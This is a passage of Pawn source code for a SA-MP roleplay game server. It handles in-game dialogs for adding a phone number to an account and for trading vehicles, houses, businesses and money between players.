			ShowPlayerDialog(playerid, DIALOG_BSECURITATE+1, DIALOG_STYLE_INPUT, "Add phone number", "(!) If you add a phone number, it will not be changed!\n\
			(!) Enter a valid phone number of the network (Orange, Vodafone, Telekom, Digi), phone number must have 10 characters.\n\
			Ex: 07xxxxxxxx.","Add", "CANCEL");
		}
	}
	if(dialogid == DIALOG_BSECURITATE+1)
	{
		if(!response) return 1;
		if(response)
		{
			if(strlen(inputtext) == 10)
			{
				if(IsNumeric(inputtext))
				{
					new sqlupdate[1000];
					new ip[16];
					GetPlayerIp(playerid, ip, 16);
					new clasaip[64];
					strdel(ip, 8, strlen(ip));
					format(clasaip, sizeof(clasaip), "%s",ip);
					strcpy(PlayerInfo[playerid][pNrTel], inputtext, 200);
					mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `NumarTelefon` = '%s' WHERE `id`='%d'",inputtext, PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL, sqlupdate, "", "");
					mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `ClasaIPTel` = '%s' WHERE `id`='%d'",clasaip, PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL, sqlupdate, "", "");
					format(MGLOBAL, sizeof(MGLOBAL), "Your phone number has been set, it is: {0066FF}%s",inputtext);
					SCM(playerid, COLOR_SERVER, MGLOBAL);
				}
				else
				{
					ShowPlayerDialog(playerid, DIALOG_BSECURITATE+1, DIALOG_STYLE_INPUT, "Add phone number", "(!) If you add a phone number, it will not be changed!\n\
					(!) Enter a valid phone number of the network (Orange, Vodafone, Telekom, Digi), telephone number must have 10 characters.\n\
					Ex: 07xxxxxxxx.","Add", "CANCEL");
				}
			}
			else 
			{
				SCM(playerid, -1, "Entered number does not contain 10 characters.");
				ShowPlayerDialog(playerid, DIALOG_BSECURITATE+1, DIALOG_STYLE_INPUT, "Add phone number", "(!) If you add a phone number, it will not be changed!\n\
				(!) Enter a valid phone number of the network (Orange, Vodafone, Telekom, Digi), telephone number must have 10 characters.\n\
				Ex: 07xxxxxxxx.","Add", "CANCEL");
			}
		}
	}
	if(dialogid == DIALOG_TRADE)
	{
		if(!response) return 1;
		if(listitem == 0)
		{
			new masina[1000], masina1[1000];
			new masiniimperfecte = 0;
			if(PlayerInfo[playerid][pPcarkey] != 0)// slot 1
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPcarkey]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pmotokey] != 0)// slot 2
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pmotokey]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pprcarkey] != 0)// slot 3
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pprcarkey2] != 0)// slot 4
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey2]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pPPluscarkey] != 0)// slot 5
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pPPluscarkey2] != 0) // slot 6
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey2]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey7] != 0) // slot 7
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey7]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey8] != 0) // slot 8
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey8]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey9] != 0) // slot 9
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey9]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey10] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey10]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey11] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey11]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey12] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey12]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey13] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey13]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey14] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey14]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(PlayerInfo[playerid][pCarkey15] != 0) // slot 10
			{
				new rezolvare[1500];
				mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey15]);
				new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
				if(cache_get_row_count() < 1) masiniimperfecte++;
				cache_delete(rezolvarebugdefinitiv);
			}
			if(masiniimperfecte > 0)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "you %d imperfect vehicles for can type this command, these vehicles will need to be removed from your possession.",masiniimperfecte);
				ShowPlayerDialog(playerid, DIALOG_MASINIIMPERFECTE, DIALOG_STYLE_MSGBOX, "Server: The problem vehicles", MGLOBAL, "Accept", "Refuse");
				return 1;
			}
			if(PlayerInfo[playerid][pPcarkey] != 0)// slot 1
			{
				//if(CarInfo[PlayerInfo[playerid][pPcarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPcarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPcarkey]][cID2] < 1) masiniimperfecte++;
				if(personalcar[0][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPcarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][0]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPcarkey]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pmotokey] != 0)// slot 2
			{
				//if(CarInfo[PlayerInfo[playerid][pmotokey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pmotokey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pmotokey]][cID2] < 1) masiniimperfecte++;
				if(personalcar[1][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pmotokey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][1]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pmotokey]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pprcarkey] != 0)// slot 3
			{
				//if(CarInfo[PlayerInfo[playerid][pprcarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pprcarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pprcarkey]][cID2] < 1) masiniimperfecte++;
				if(personalcar[2][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][2]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pprcarkey2] != 0)// slot 4
			{
				//if(CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pprcarkey2]][cID2] < 1) masiniimperfecte++;
				if(personalcar[3][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][3]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pPPluscarkey] != 0)// slot 5
			{
				//if(CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPPluscarkey]][cID2] < 1) masiniimperfecte++;
				if(personalcar[4][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][4]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pPPluscarkey2] != 0) // slot 6
			{
				//if(CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cID2] < 1) masiniimperfecte++;
				if(personalcar[5][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][5]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pCarkey7] != 0) // slot 7
			{
				//if(CarInfo[PlayerInfo[playerid][pCarkey7]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey7]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey7]][cID2] < 1) masiniimperfecte++;
				if(personalcar[6][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey7]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][6]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey7]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pCarkey8] != 0) // slot 8
			{
				//if(CarInfo[PlayerInfo[playerid][pCarkey8]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey8]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey8]][cID2] < 1) masiniimperfecte++;
				if(personalcar[7][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey8]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][7]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey8]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pCarkey9] != 0) // slot 9
			{
				//if(CarInfo[PlayerInfo[playerid][pCarkey9]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey9]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey9]][cID2] < 1) masiniimperfecte++;
				if(personalcar[8][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey9]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][8]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey9]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pCarkey10] != 0) // slot 10
			{
				//if(CarInfo[PlayerInfo[playerid][pCarkey10]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey10]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey10]][cID2] < 1) masiniimperfecte++;
				if(personalcar[9][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey10]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][9]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey10]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
				strcat(masina, masina1);
			}
			if(PlayerInfo[playerid][pCarkey11] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
			{
				if(personalcar[10][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey11]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][10]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey11]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				if(PlayerInfo[playerid][pVip] > 0)
				{
					format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
					strcat(masina, masina1);
				}	
			}
			if(PlayerInfo[playerid][pCarkey12] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
			{
				if(personalcar[11][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey12]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][11]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey12]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				if(PlayerInfo[playerid][pVip] > 0)
				{
					format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
					strcat(masina, masina1);
				}
			}
			if(PlayerInfo[playerid][pCarkey13] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
			{
				if(personalcar[12][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey13]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][12]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey13]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				if(PlayerInfo[playerid][pVip] > 0)
				{
					format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
					strcat(masina, masina1);
				}
			}
			if(PlayerInfo[playerid][pCarkey14] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
			{
				if(personalcar[13][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey14]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][13]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey14]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				if(PlayerInfo[playerid][pVip] > 0)
				{
					format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
					strcat(masina, masina1);
				}
			}
			if(PlayerInfo[playerid][pCarkey15] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
			{
				if(personalcar[14][playerid] != 0)
				{
					format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey15]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][14]));
					strcat(masina, masina1);
				}
				else
				{
					format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey15]][cModel]-400]);
					strcat(masina, masina1);
				}
			}
			else
			{
				if(PlayerInfo[playerid][pVip] > 0)
				{
					format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
					strcat(masina, masina1);
				}
			}
			format(MGLOBAL, sizeof(MGLOBAL), "Status / Vehicle\tTime to despawnare\n%s", masina);
			if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
			&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
			&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
			&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0)
				return SendClientMessage(playerid, COLOR_SERVER, "Not own any car.");
			ShowPlayerDialog(playerid,DIALOG_TRADE+1,DIALOG_STYLE_TABLIST_HEADERS,"Add a vehicle",MGLOBAL,"Select","Exit");
		}
		if(listitem == 1)
		{		
			if(PlayerInfo[playerid][pPhousekey] == 999) return SCM(playerid, COLOR_ERROR, "Do not own a house.");
			if(casa_trade[playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this item.");
			casa_trade[playerid] = PlayerInfo[playerid][pPhousekey];
			SCM(playerid, COLOR_SERVER, "{0066FF}Trade: {FFFFFF}The house was added in your list of items.");
			AdaugaItem(playerid, in_afacere_cu[playerid], 2, casa_trade[playerid]);
		}	
		if(listitem == 2)
		{
			if(PlayerInfo[playerid][pPbiskey] == 255) return SCM(playerid, COLOR_ERROR, "Do not own a business.");
			if(afacere_trade[playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this item.");
			afacere_trade[playerid] = PlayerInfo[playerid][pPbiskey];
			AdaugaItem(playerid, in_afacere_cu[playerid], 3, PlayerInfo[playerid][pPbiskey]);
			SCM(playerid, COLOR_SERVER, "{0066FF}Trade: {FFFFFF}The business was added in your list of items.");
		}
		if(listitem == 3)
		{
			if(GetPlayerCash(playerid) < 1) return SCM(playerid, COLOR_ERROR, "You have no money.");
			ShowPlayerDialog(playerid, DIALOG_TRADE+3, DIALOG_STYLE_INPUT, "Add money", "{FFFFFF}Enter {0066FF}amount of money {FFFFFF}you want to add to your list of items.\nMinimum: $1 | Maximum: $500,000,000", "Add", "CANCEL");
		}
	}
	if(dialogid == DIALOG_TRADE+3)
	{
		if(!response) return 1;
		if(!IsNumeric(inputtext)) return SCM(playerid, COLOR_ERROR, "The money must contain only numbers.");
		new suma = strval(inputtext);
		if(suma < 1 || suma > 500000000) return SCM(playerid, COLOR_ERROR, "Minimum $1 | Maximum $500,000,000");
		if(GetPlayerCash(playerid) < suma) return SCM(playerid, COLOR_ERROR, "You do not have enough money.");
		if(suma_bani_trade[playerid] > 0) return SCM(playerid, COLOR_ERROR, "You have already added money.");
		suma_bani_trade[playerid] = suma;
		format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}you added $%s in your list of items.",FormatNumber(suma));
		SCM(playerid, COLOR_SERVER, MGLOBAL);
		AdaugaItem(playerid, in_afacere_cu[playerid], 4, suma_bani_trade[playerid]);
	}	
	if(dialogid == DIALOG_TRADE+1)
	{
		if(!response) return 1;
		new reusit = 0;
		if(listitem == 0)
		{
			if(PlayerInfo[playerid][pPcarkey] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pPcarkey];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 1)
		{
			if(PlayerInfo[playerid][pmotokey] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pmotokey];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 2)
		{
			if(PlayerInfo[playerid][pprcarkey] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pprcarkey];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 3)
		{
			if(PlayerInfo[playerid][pprcarkey2] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pprcarkey2];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 4)
		{
			if(PlayerInfo[playerid][pPPluscarkey] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pPPluscarkey];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 5)
		{
			if(PlayerInfo[playerid][pPPluscarkey2] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pPPluscarkey2];
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Trade: {FFFFFF}The vehicle %s It has been added to your list of items.",aVehicleNames[CarInfo[vehicule[listitem][playerid]][cModel]-400]);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			reusit = vehicule[listitem][playerid];
		}
		if(listitem == 6)
		{
			if(PlayerInfo[playerid][pCarkey7] < 1) return SCM(playerid, COLOR_ERROR, "You have a vehicle this slot.");
			if(vehicule[listitem][playerid] > 0) return SCM(playerid, COLOR_ERROR, "You've already added this vehicle");
			vehicule[listitem][playerid] = PlayerInfo[playerid][pCarkey7];
